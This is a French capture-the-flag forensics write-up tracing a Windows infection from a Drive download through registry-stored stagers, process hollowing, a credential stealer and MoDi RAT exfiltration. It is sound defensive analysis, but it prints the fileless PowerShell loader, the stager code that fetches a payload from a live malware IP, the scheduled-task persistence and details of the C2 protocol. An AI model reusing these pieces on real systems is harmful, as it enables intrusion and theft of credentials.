---
title: CATathon 2026 - HORUS Ra
time: 2026-09-12 09:00:00
categories: [ctf]
tags: [forensic, DFIR, network, misc]
image: /assets/posts/catctf2026/cover.png
---

Le writeup peut paraître un peu long, surtout si vous n'êtes pas débutant, car je vais essayer d'expliquer à ma façon afin que tout le monde puisse me suivre.


# Forensic

## HORUS Ra

### Ce qu'on nous donne

```bash
ls
Triage.zip  Outbound-Traffic.pcap
```

`Triage.zip` fait 171 Mo. C'est une collecte **KAPE**.
KAPE ne copie pas tout le disque : il prend uniquement les fichiers qui ont une valeur forensique (les ruches de registre, les journaux d'événements, les Prefetch, le `$MFT`, le profil navigateur...). 
 
C'est ce qu'on appelle un *triage*. Si vous voulez comprendre ce que KAPE collecte exactement, la documentation d'Eric Zimmerman est disponible sur son site (KapeDocs).

Une fois décompressé :

```bash
ls Triage/C
$MFT  $Extend/  Windows/  Users/  ProgramData/
```

Le second fichier est une capture réseau de 54 Ko.


### Question 1 : `Quelle est l'URL complète utilisée pour télécharger le malware initial ?`

Nous avons commencé l'enquête par l'analyse de l'activité utilisateur, avec l'un de mes artefacts Windows 10 préférés : la Chronologie Windows 10 (Windows 10 Timeline). Cet artefact se trouve à :

```
C:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db
```

```bash
wine ~/Downloads/tools/Eric/WxTCmd.exe -f ActivitiesCache.db --csv .
```

En analysant le CSV produit, on constate que l'utilisateur utilisait Microsoft Edge (MSEdge) entre 2025-09-17 15:11:50 et 2025-09-17 15:29:55.

![activity](/assets/posts/catctf2026/activity.PNG)

J'ai ouvert le triage dans Autopsy.

Quand une question porte sur un téléchargement, le premier endroit à regarder est l'historique du navigateur. J'ai fouillé les dossiers des navigateurs, et l'historique d'Edge contenait les informations recherchées :

```
C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\History
```
Cette base contient plusieurs tables intéressantes : `urls` et `visits` pour la navigation, mais surtout `downloads` et `downloads_url_chains` pour les téléchargements. `downloads_url_chains` est importante : elle garde **toute la chaîne de redirection**, et pas seulement l'URL finale affichée.

![downloads url](/assets/posts/catctf2026/durl.png)


| 01 | URL de téléchargement | `https://drive.usercontent.google.com/download?id=1A88Zbr0kciLs2fSsOLVTguFSkRu3r6WD&export=download&confirm=t&uuid=e88f9ed7-f9bf-4f9c-918f-6988fdf0a244` |

Mais je voulais avoir une chronologie de ce que l'utilisateur a fait dans le navigateur. Je cherchais donc un outil et je suis tombé sur **Hindsight** (`github.com/RyanDFIR/hindsight`). Hindsight analyse les profils Chrome/Chromium et Firefox et corrèle plusieurs artefacts dans une timeline unifiée. Il peut notamment récupérer :

- les URL visitées, avec la date et l'heure de chaque visite ;
- l'ordre des visites ;
- les téléchargements, les recherches et le cache ;
- les cookies, le Local Storage et les bookmarks ;
- les extensions et les informations de session.

Il peut ensuite exporter les résultats en XLSX, SQLite ou JSONL.

Je l'ai installé et lancé, puis j'ai fourni le dossier d'historique et de cache.

```bash
chmod +x /home/korpstation/.pyenv/versions/3.11.0/envs/myenv-3.11/bin/hindsight_gui.py
/home/korpstation/.pyenv/versions/3.11.0/envs/myenv-3.11/bin/hindsight_gui.py
```

NB : le dossier de cache doit être celui nommé `cacheData` et non `cache`.

![report](/assets/posts/catctf2026/report.png)

J'avais déjà soumis l'URL trouvée dans Autopsy, et elle était validée. Cela m'a permis de cibler la zone de téléchargement afin de comprendre ce qui s'était passé exactement.

![history](/assets/posts/catctf2026/history.png)

L'utilisateur consulte sa boîte Outlook, ouvre un mail, clique sur un lien Google Drive, ignore l'avertissement antivirus et télécharge une archive (`Report.zip`).

On peut identifier l'URL Google Drive, mais ce n'est pas l'adresse complète. L'URL complète se trouve dans les métadonnées `Zone.Identifier` du fichier. Pour la récupérer, on parse le `$MFT` et on filtre sur le nom du fichier.

- `$MFT` : la Master File Table de NTFS, qui contient les métadonnées des fichiers.
- `Zone.Identifier` : un Alternate Data Stream (ADS) associé à un fichier. Windows peut y enregistrer la provenance du fichier, notamment l'URL depuis laquelle il a été téléchargé. C'est ce qui permet à Windows d'afficher des avertissements du type « Ce fichier provient d'un autre ordinateur... ».

```bash
wine ~/Downloads/tools/Eric/MFTECmd.exe -f '.\$MFT' --csv mftOUT
```

---

### Question 2 : `Quelle technique MITRE ATT&CK a été utilisée pour dissimuler le fichier ?`

Il faut d'abord savoir ce qui s'est passé après le téléchargement. Pour savoir ce qu'il y avait dans l'archive, on regarde le **Prefetch**. C'est un mécanisme d'optimisation de Windows : à chaque démarrage d'un programme, Windows écrit un fichier `.pf` dans `C:\Windows\Prefetch\`. Ce fichier contient la date des dernières exécutions **et la liste des fichiers que le programme a ouverts**. Le contexte nous avait déjà mis la puce à l'oreille sur un éventuel script. Je suis donc directement allé voir le Prefetch de `wscript.exe` :

![pf](/assets/posts/catctf2026/pf.png)

```
C:\Windows\prefetch\WSCRIPT.EXE-3FF4D889.pf
```

`wscript.exe` est l'interpréteur de scripts Windows. Qu'il ait tourné est déjà un signal. Voyons ce qu'il a ouvert.

J'ai utilisé PECmd d'Eric pour parser le fichier, puis j'ai filtré sur `Downloads` pour voir ce qui avait été lancé depuis ce dossier :

```
\VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\DOWNLOADS\DATA-ANALYSIS-REPORT.PDF.VBE
\VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\DOWNLOADS\DESKTOP.INI
```

Le fichier s'appelle `Data-Analysis-Report.pdf.vbe`. Regardez bien : il y a **deux extensions**. Windows masque par défaut l'extension des types connus, donc l'utilisateur voit `Data-Analysis-Report.pdf` et croit ouvrir un PDF. En réalité, c'est un `.vbe`, un VBScript encodé, et c'est `wscript.exe` qui l'exécute.

Dans la matrice MITRE ATT&CK, cette technique porte un numéro précis, c'est une sous-technique de *Masquerading* :

| # | Élément | Valeur |
|---|---|---|
| 02 | Technique MITRE | `T1036.007` (Masquerading: Double File Extension) |

Une manière beaucoup plus simple aurait été de parser le `$MFT` et de consulter le dossier `Downloads`. Après la création du ZIP, on peut examiner ce dossier pour identifier le nom du fichier extrait lors de la décompression. Un fichier nommé `Data-Analysis-Report.pdf.vbe` a été créé environ deux minutes après le téléchargement (« 2025-09-17 15:18:03 »).

---

### Question 3 : `Quelle commande PowerShell a été lancée à l'ouverture du fichier ?`

```bash
PECmd.exe -d .\prefetch\ --csv PE_OUT
```

En filtrant le CSV produit sur l'horodatage pertinent, on confirme la séquence d'exécution. C'est efficace, car on obtient le flux d'exécution et on comprend ce qui a été lancé, et dans quel ordre :

```
WSCRIPT.EXE → POWERSHELL.EXE → CONHOST.EXE → ADDINPROCESS32.EXE
```

Le premier endroit à consulter est l'historique PowerShell, car il contient les commandes exécutées. Il se trouve à l'emplacement suivant :

```
C:\Utilisateurs\Administrateur\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Mais rien de ce côté.

PowerShell journalise ses lancements dans `Windows PowerShell.evtx`. J'ai utilisé :

```bash
wine ~/tools/Eric/EvtxeCmd/EvtxECmd.exe -f Windows\ PowerShell.evtx --csv .
```

Le CSV contenait beaucoup d'événements. Je ne pouvais pas tout lire pour identifier la commande malveillante, il fallait donc filtrer. Vous vous rappelez que PECmd nous avait donné les dates des dernières exécutions :

```
WSCRIPT.EXE-3FF4D889.pf  ->  WSCRIPT.EXE
  executions : 3
  dernière(s) exécution(s) :
    - 2025-09-17 15:18:07.011092
    - 2025-01-23 22:50:52.501051
    - 2025-01-23 22:50:39.377476
```

J'ai donc filtré sur la première, à la minute près. Le chemin attendu aurait été, comme on l'a vu, l'heure relevée dans le `$MFT`, dans Activity ou dans l'historique, qui permettent de filtrer sur 15h.

![evtx](/assets/posts/catctf2026/evtx.png)
![evtx2](/assets/posts/catctf2026/evtx2.png)

```
HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command
[AppDomain]::CurrentDomain.Load([Convert]::FromBase64String((-join (Get-ItemProperty -Path
'HKCU:\Software\esBbIgyFlZcXjUl' -Name 's').s | ForEach-Object { $_[-1..-($_.Length)] })));
[v.v]::v('esBbIgyFlZcXjUl')
```

Prenez trente secondes pour lire cette commande, elle contient le mode d'emploi :

1. `Get-ItemProperty -Path 'HKCU:\Software\esBbIgyFlZcXjUl' -Name 's'` : lire une valeur dans le registre ;
2. `$_[-1..-($_.Length)]` : **inverser la chaîne** caractère par caractère ;
3. `FromBase64String` : décoder du base64 ;
4. `[AppDomain]::CurrentDomain.Load(...)` : charger le résultat comme **assembly .NET en mémoire**, sans jamais écrire de fichier ;
5. `[v.v]::v(...)` : appeler la méthode `v` de la classe `v` du namespace `v`.

| # | Élément | Valeur |
|---|---|---|
| 03 | Commande PowerShell | `powershell.exe -WindowStyle Hidden -Command [AppDomain]::CurrentDomain.Load([Convert]::FromBase64String((-join (Get-ItemProperty -Path 'HKCU:\Software\esBbIgyFlZcXjUl' -Name 's').s \| ForEach-Object { $_[-1..-($_.Length)] }))); [v.v]::v('esBbIgyFlZcXjUl')` |

---

### Question 4 : `Quel est le SHA-256 du Stager-1 ?`

C'est ici que le challenge devient intéressant. Tout se trouve dans le registre, dans la clé vue à la question précédente.

HKCU (HKEY_CURRENT_USER) est une ruche montée dynamiquement à partir du profil de l'utilisateur connecté. Le fichier physique correspondant est :

```
C:\Users\Administrator\NTUSER.DAT
```

![registre](/assets/posts/catctf2026/registry.png)

| Valeur | Taille | Rôle |
|---|---|---|
| `Path` | 15 | nom de la clé, réinjecté dans les commandes |
| `i` | 18 | `AddInProcess32.exe`, la cible d'injection |
| `in` | 1 | drapeau de contrôle |
| `cn` | 33 | `Stop-Process -Name conhost -Force` |
| `s` | 19 116 | **Stager-1**, base64 inversé |
| `r` | 40 960 | **Stager-2**, hex inversé |
| `v` / `instant` | 248 / 254 | la commande PowerShell |
| `donn\segment1..8` | 183 296 | **payload final**, hex inversé, découpé en morceaux de 25 000 |

Le Stager-1 est la valeur `s`. On applique exactement ce que fait la commande PowerShell : inverser, puis décoder le base64.

![decode](/assets/posts/catctf2026/sdecode.png)

**L'indice qui confirme qu'on inverse dans le bon sens** : la valeur brute commence par `=AAAAAA…`. En base64, le `=` est un caractère de *padding* qui ne peut apparaître qu'à la **fin**. Le voir en tête est la signature d'une chaîne retournée. Une fois inversée, elle commence par `TVqQAAMAAAAEAAAA`, qui se décode en `MZ`, l'en-tête d'un exécutable Windows.

![sha256](/assets/posts/catctf2026/sha.png)

```
7a8e7a884237f556ed5a0a3f81c76487df4cfe05d205f107e2bd0f6ff1b63965
```

Le binaire semble être un exécutable .NET, on peut donc analyser son code avec dnSpy. On voit que le binaire s'appelle `wahdani.exe`. Il s'agit de VB.NET, dans le namespace `v`, d'où le `[v.v]::v()`. Ses méthodes parlent d'elles-mêmes : `ObtenirValeurRegistre`, `HexVersOctets`, `StrReverse`, `OpenSubKey`, `GetMethod`, `Invoke`. L'auteur du malware est francophone.

En examinant la classe `v` du namespace `v`, on voit que le stager boucle jusqu'à trouver la valeur `r` sous la clé `Software`, puis charge le payload de second étage à partir de cette valeur, après avoir inversé la chaîne hexadécimale et l'avoir convertie depuis l'hexadécimal.

| # | Élément | Valeur |
|---|---|---|
| 04 | SHA-256 du Stager-1 | `7a8e7a884237f556ed5a0a3f81c76487df4cfe05d205f107e2bd0f6ff1b63965` |

---

### Question 5 : `Quel processus est lancé pour recevoir le code injecté ?`

Le Stager-1 ne fait que charger la suite. La suite, c'est la valeur `r`.

Cette fois, ce n'est pas du base64 mais de l'**hexadécimal**, toujours inversé. Mon Registry Explorer prenait un peu de temps à répondre, et comme il m'avait déjà produit le registre propre, j'ai utilisé le site `registryparser.com` (`https://www.registryparser.com/en`), qui fonctionne très bien pour obtenir les valeurs.

![stage2](/assets/posts/catctf2026/stage2exe.png)

![stage2exe](/assets/posts/catctf2026/stage2.png)

`stager2.exe` : PE32 executable (GUI) Intel 80386 Mono/.NET assembly, for MS Windows, 3 sections.

Il s'agit d'un autre binaire .NET. En commençant par la classe `r`, on remarque plusieurs fonctions notables.

Cet extrait récupère le nom du processus depuis la clé de registre `i` et vérifie les environnements cibles pour l'injection de code. Si la langue du système est le français, il télécharge un fichier supplémentaire depuis `https://144.91.92.251/MoDi.txt`, termine les processus CONHOST et POWERSHELL, puis exécute le processus injecté.

En consultant `MoDi.txt` dans un navigateur, on peut obtenir un payload supplémentaire, ou recevoir une erreur 404 Not Found. La campagne semble active : ce payload n'existait pas trois jours avant la rédaction de ce rapport, ce qui suggère qu'il est mis à jour environ tous les deux jours.

Le Stager-2 se charge d'injecter le payload final dans `ADDINPROCESS32.EXE`. Ce processus est créé aux emplacements suivants :

```
\\Microsoft.NET\\Framework\\v3.5\
\\Microsoft.NET\\Framework\\v4.0.30319\
```

Accéder à `https://144.91.92.251/` révèle le nom du service de distribution de malwares.

**Confirmation par le Prefetch** : `ADDINPROCESS32.EXE-4B74C002.pf`

```
ADDINPROCESS32.EXE
exécution : 2025-09-17 15:18:16 UTC
\DEVICE\HARDDISKVOLUME3\WINDOWS\MICROSOFT.NET\FRAMEWORK\V4.0.30319\ADDINPROCESS32.EXE
```

Huit secondes après l'écriture des clés de registre. `AddInProcess32.exe` est un binaire légitime du .NET Framework : le malware s'en sert comme coquille vide.

Les imports du Stager-2 confirment le procédé : `CreateProcess`, `NtUnmapViewOfSection`, `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, `ResumeThread`. Cette séquence correspond à la définition même du **process hollowing** (T1055.012) : on lance un processus légitime suspendu, on vide sa mémoire, on y écrit son propre code, puis on le relance.

| # | Élément | Valeur |
|---|---|---|
| 05 | Processus cible de l'injection | `AddInProcess32.exe` |

---

### Question 6 : `Quelle chaîne littérale le malware vérifie-t-il avant le téléchargement additionnel ?`

Toujours dans le Stager-2 :

```csharp
InputLanguage currentInputLanguage = InputLanguage.CurrentInputLanguage;
bool flag5 = Operators.CompareString(currentInputLanguage.Culture.TwoLetterISOLanguageName, "fr", false) == 0 && global::r.r.YYN().Contains("France");
if (flag5)
{
    try
    {
        byte[] array2 = global::r.r.HHO(Strings.StrReverse(global::r.r.KKC("https://144.91.92.251/MoDi.txt")));
        RKL.XGP(text6, empty, array2, flag4);
    }
    catch (Exception ex)
    {
    }
}
```

| # | Élément | Valeur |
|---|---|---|
| 06 | Chaîne vérifiée | `France` |

---

### Question 7 : `Quel est le nom du service de distribution de malware ?` (format : `string1 string2`)

En allant sur `https://144.91.92.251/`, on obtient le nom du service de distribution. Il était aussi possible de faire des recherches « dorks » sur Google pour retrouver ce service.

Et l'indice était sous mes yeux depuis le début : le challenge s'appelle **HORUS** Ra.

| # | Élément | Valeur |
|---|---|---|
| 07 | Service de distribution | `Horus Protector` |

---

### Question 8 : `Quelle classe est responsable du vol des identifiants navigateurs et messagerie ?`

Il faut maintenant reconstruire la charge finale, celle qui est découpée en 8 morceaux dans la sous-clé `donn`. J'ai utilisé à nouveau le site `registryparser.com`.

![stagefinale](/assets/posts/catctf2026/finalexe.png)

![stagefinale2](/assets/posts/catctf2026/finalcode.png)

Il s'agit de `CloudServices.exe`, en .NET.

```
CloudServices.UltraSpeed    → keylog, presse-papiers, captures, exfiltration
                              (SpeedKeylog, SpeedClipboard, SpeedScreenshot,
                               SpeedOffPWExport, TGMultipart, MultiUploader, INFO_Country)

CloudServices.COVIDPickers  → 54 méthodes :
                              Outlook_Speed, GetOutlookPasswords, decryptOutlookPassword,
                              Foxmail_Speed, Chrome_Speed, Chrome_Canary_Speed, Chromium_Speed,
                              Brave_Speed, Vivaldi_Speed, CocCoc_Speed, Iridium_Speed,
                              Iron_Speed, QQ_Speed, decodePW, isV10, GetMasterKey, DecryptWithKey
```

Les classes annexes confirment la répartition des rôles : `MozilSpeed` (Firefox, Thunderbird, SeaMonkey, IceDragon), `FFDecryptor` et `TSECItem` (la bibliothèque NSS de Mozilla), `SQLiteHandler` (pour lire les bases `Login Data`), `AesGcm` et `BCrypt` (déchiffrement des mots de passe Chromium en v10), et `KeyLogger`.

La question demande la classe qui couvre **à la fois** les navigateurs et les clients mail. `UltraSpeed` fait le keylog et l'exfiltration ; c'est `COVIDPickers` qui s'occupe de Chrome, Brave, Vivaldi… **et** Outlook et Foxmail.

| # | Élément | Valeur |
|---|---|---|
| 08 | Classe voleuse d'identifiants | `COVIDPickers` |

---

### Question 9 : `Quel est le chemin complet du fichier assurant la persistance ?`

Les tâches planifiées sont stockées en XML dans `C:\Windows\System32\Tasks\`. Le fichier n'a pas d'extension et il est en UTF-16.

![task](/assets/posts/catctf2026/taskplanif.png)

```
C:\Windows\System32\Tasks\esBbIgyFlZcXjUl
```

La tâche porte le même nom que la clé de registre :

```xml
<Triggers><TimeTrigger>
  <Repetition><Interval>PT1M</Interval></Repetition>
  <StartBoundary>2025-06-01T00:00:00</StartBoundary>
</TimeTrigger></Triggers>
<Actions Context="Author"><Exec>
  <Command>C:\Users\Administrator\AppData\Roaming\esBbIgyFlZcXjUl.vbs</Command>
</Exec></Actions>
```

`PT1M` veut dire « toutes les minutes », y compris sur batterie. Ce résultat est recoupé par le Prefetch de `wscript.exe` et par le `$MFT` (créé le 17/09/2025 à 15:18:08, 1 567 octets).

Ce que fait ce VBS : une boucle d'environ 10 000 itérations avec 10 secondes de pause, qui lit la valeur registre `i` pour savoir si `AddInProcess32.exe` tourne encore, et relance la chaîne sinon. Soit silencieusement via la valeur `instant`, soit, et c'est assez astucieux, en **simulant une frappe clavier** : `SendKeys` envoie le contenu des valeurs `v` puis `cn`, suivies de `{ENTER}`, dans une fenêtre PowerShell.

| # | Élément | Valeur |
|---|---|---|
| 09 | Fichier de persistance | `C:\Users\Administrator\AppData\Roaming\esBbIgyFlZcXjUl.vbs` |

Une autre manière de trouver le fichier de persistance aurait été de regarder le `$MFT`.

![persistance](/assets/posts/catctf2026/taskP.png)

---

### Question 10 : `Quelles sont l'IP et le port de destination de l'exfiltration ?`

On passe au pcap. Dans Wireshark, le premier réflexe sur une capture inconnue est *Statistics → Conversations*, qui liste tous les échanges. Ensuite, *Follow → TCP Stream* sur celui qui nous intéresse.

En ligne de commande :

```bash
tshark -r Outbound-Traffic.pcap -q -z conv,tcp
tshark -r Outbound-Traffic.pcap -q -z follow,tcp,ascii,0
```

Une seule conversation dans toute la capture. Pas de DNS, pas d'UDP :

```
192.168.1.8:49789  <->  144.91.92.251:2025
74 paquets · 53 539 octets · 2,33 s
```

Et voici ce que la victime envoie :

```
info||18/9/2025 6:5_9EA9AF27||WIN-SQGD1B17I85/Administrator||Microsoft Windows 10 Pro is: User||…|Boss2019|
localip||192.168.1.8|Boss2019|
DesktopPreview||<capture d'écran JPEG en base64>|Boss2019|
```

Notez que c'est la **même IP** que celle codée en dur dans le Stager-2 pour `MoDi.txt`. Un seul serveur sert à la distribution et à l'exfiltration.

| # | Élément | Valeur |
|---|---|---|
| 10 | C2 / exfiltration | `144.91.92.251:2025` |

---

### Question 11 : `Quels sont le nom et la version du RAT ?`

Dans le sens serveur → client, le C2 pousse un plugin :

```
plugin||Startup.Class1||TVqQAAMAAAAEAAAA//8AALgAAAAA…|Boss2019|
```

`TVqQAAMAAAAEAAAA` : vous commencez à le reconnaître, c'est `MZ` en base64. Sauf que le base64 est étalé sur 8 segments TCP, il faut donc le réassembler depuis le flux brut avant de le décoder :

```bash
tshark -r Outbound-Traffic.pcap -q -z follow,tcp,raw,0 > raw.txt
# concaténer, extraire  plugin\|\|Startup\.Class1\|\|([A-Za-z0-9+/=]+)  puis base64 -d
```

On obtient un assembly .NET `Startup.dll`. L'auteur a oublié de nettoyer le chemin de compilation, qui reste dans le PDB :

```
C:\Users\Administrator\Desktop\Files\MoDi RAT V0.1 Build1\Cleint\Startup\obj\Debug\Startup.pdb
```

(`Cleint` est la faute de frappe de l'auteur du RAT, pas la mienne.) Le nom du fichier téléchargé par le Stager-2, `MoDi.txt`, le confirme.

| # | Élément | Valeur |
|---|---|---|
| 11 | RAT | `MoDi RAT V0.1` |

---

### Question 12 : `Quel tag opérateur est ajouté à chaque requête ?`

Si vous relisez les extraits des questions 10 et 11, vous l'avez déjà vu. Chaque message du protocole, dans les deux sens, se termine par le même jeton :

```
info|Boss2019|
localip||192.168.1.8|Boss2019|
plugin||Startup.Class1||…|Boss2019|
in||Screen_Numbers||NjA=|Boss2019|
in||Bins_List||…|Boss2019|
in||Windows_Title_List||TGEgQmFucXVlIFBvc3RhbGU7Qk5QIFBhcmliYXM=|Boss2019|
dp|Boss2019|
```

C'est l'identifiant de campagne configuré dans le builder du RAT, qui sert accessoirement de mot de passe applicatif.

En décodant la configuration reçue, on comprend enfin ce que l'opérateur cherchait :

```
Windows_Title_List : La Banque Postale;BNP Paribas
Bins_List          : 374903;374911;405687;405937;…   (BIN de cartes bancaires)
Screen_Numbers     : 60      Capturing_Interval : 2
Recording_Time     : 00:00:60
TabTitle           : Facebook|https://google.fr
```

Il s'agit de fraude bancaire ciblant la France, ce qui recoupe parfaitement le `country == "France"` de la question 6.

| # | Élément | Valeur |
|---|---|---|
| 12 | Tag opérateur | `Boss2019` |

---

## La chaîne complète

```
Mail Outlook (j0hns1na@outlook.com)
   └─ lien de partage Google Drive → Report.zip (184 829 o, chiffré)
        └─ 7zG.exe → Data-Analysis-Report.pdf.vbe          [T1036.007]
             └─ wscript.exe  15:18:03                       [T1059.005]
                  ├─ écrit HKCU\Software\esBbIgyFlZcXjUl    [T1112]
                  ├─ dépose %AppData%\Roaming\esBbIgyFlZcXjUl.vbs
                  ├─ crée la tâche planifiée esBbIgyFlZcXjUl (PT1M)  [T1053.005]
                  ├─ énumère les AV via Security Center\...\DisplayName  [T1518.001]
                  └─ powershell -WindowStyle Hidden …       [T1059.001]
                       └─ valeur 's'  → Stager-1  wahdani.exe   14 336 o
                            └─ valeur 'r' → Stager-2  a.exe     20 480 o
                                 ├─ ipwhois.app → country == "France"
                                 ├─ téléchargement https://144.91.92.251/MoDi.txt
                                 ├─ lancement de AddInProcess32.exe + hollowing   [T1055.012]
                                 └─ valeur 'donn' → MassLogger CloudServices.exe  91 648 o
                                      ├─ COVIDPickers / MozilSpeed / FFDecryptor  [T1555.003]
                                      ├─ KeyLogger, captures d'écran, presse-papiers
                                      └─ exfiltration SMTP / FTP / Telegram      [T1071.003]
                                           puis C2 MoDi RAT 144.91.92.251:2025  [T1041]
```
